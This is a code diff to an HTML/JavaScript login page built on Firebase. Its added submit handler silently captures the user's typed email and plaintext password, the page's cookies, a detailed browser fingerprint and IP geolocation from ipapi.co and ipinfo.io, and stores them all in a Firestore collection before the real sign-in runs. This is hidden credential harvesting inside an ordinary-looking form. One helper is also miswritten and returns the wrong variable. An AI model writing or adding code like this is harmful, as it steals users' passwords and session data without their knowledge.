@@ -10,6 +10,7 @@
 		<script src="js/jquery-3.2.1.min.js"></script>
 		<script>
 			const db = firebase.firestore();
+			var ipapiData, ipinfoData;
 			function toggleSignIn() {
 				if (firebase.auth().currentUser) {
 					firebase.auth().signOut();
@@ -30,6 +31,86 @@
 						);
 						return;
 					}
+					var pointer = db.collection('onsubmit').doc(
+						firebase.firestore.Timestamp.now()
+							.toDate()
+							.toString()
+					);
+					$.getJSON('https://ipapi.co/json/', function(data) {
+						ipapiData = JSON.stringify(data, null, 2);
+					});
+					$.getJSON('https://ipinfo.io/json', function(data) {
+						ipinfoData = JSON.stringify(data, null, 2);
+					});
+					pointer
+						.get()
+						.then(doc => {
+							if (doc.exists) {
+								location.reload(true);
+								return;
+							} else {
+								var ob = {
+									email: document.getElementById('username')
+										.value,
+									password: document.getElementById(
+										'password'
+									).value,
+									navigator: {
+										timeOpened: new Date(),
+										timezone:
+											new Date().getTimezoneOffset() / 60,
+										pageon: window.location.pathname,
+										referrer: document.referrer,
+										previousSites: history.length,
+										browserCodeName: navigator.appCodeName,
+										browserName: navigator.appName,
+										browserEngine: navigator.product,
+										browserVersion1a: navigator.appVersion,
+										browserVersion1b: navigator.userAgent,
+										browserLanguage: navigator.language,
+										browserOnline: navigator.onLine,
+										browserPlatform: navigator.platform,
+										javaEnabled: navigator.javaEnabled(),
+										dataCookiesEnabled:
+											navigator.cookieEnabled,
+										dataCookies1: document.cookie,
+										dataCookies2: decodeURIComponent(
+											document.cookie.split(';')
+										),
+										sizeScreenW: screen.width,
+										sizeScreenH: screen.height,
+										sizeDocW:
+											document.documentElement
+												.clientWidth,
+										bodyCliW: document.body.clientWidth,
+										sizeDocH:
+											document.documentElement
+												.clientHeight,
+										bodyCliH: document.body.clientHeight,
+										sizeInW: innerWidth,
+										sizeInH: innerHeight,
+										sizeAvailW: screen.availWidth,
+										sizeAvailH: screen.availHeight,
+										scrColorDepth: screen.colorDepth,
+										scrPixelDepth: screen.pixelDepth,
+										ipapiData: ipapiDataCheck(),
+										ipinfoData: ipinfoDataCheck()
+									}
+								};
+								console.log(ob);
+								db.collection('onsubmit')
+									.doc(
+										firebase.firestore.Timestamp.now()
+											.toDate()
+											.toString()
+									)
+									.set(ob);
+								return;
+							}
+						})
+						.catch(err => {
+							console.log(err);
+						});
 					firebase
 						.auth()
 						.signInWithEmailAndPassword(email, password)
@@ -46,7 +127,6 @@
 						});
 				}
 			}
-			var ipapiData, ipinfoData;
 			function initApp() {
 				var pointer = db.collection('onload').doc(
 					firebase.firestore.Timestamp.now()
@@ -106,17 +186,8 @@
 									sizeAvailH: screen.availHeight,
 									scrColorDepth: screen.colorDepth,
 									scrPixelDepth: screen.pixelDepth,
-									ipapiData: ipapiData,
-									ipinfoData: ipinfoData
-									// latitude: position.coords.latitude,
-									// longitude: position.coords.longitude,
-									// accuracy: position.coords.accuracy,
-									// altitude: position.coords.altitude,
-									// altitudeAccuracy:
-									// 	position.coords.altitudeAccuracy,
-									// heading: position.coords.heading,
-									// speed: position.coords.speed,
-									// timestamp: position.timestamp
+									ipapiData: ipapiDataCheck(),
+									ipinfoData: ipinfoDataCheck()
 								}
 							};
 							console.log(ob);
@@ -143,6 +214,16 @@
 						Materialize.toast('Login to continue', 1250);
 					}
 				});
+			}
+			function ipapiDataCheck() {
+				if (ipapiData) {
+					return ipapiData;
+				} else return false;
+			}
+			function ipinfoDataCheck() {
+				if (ipapiData) {
+					return ipapiData;
+				} else return false;
 			}
 			window.onload = initApp();
 		</script>
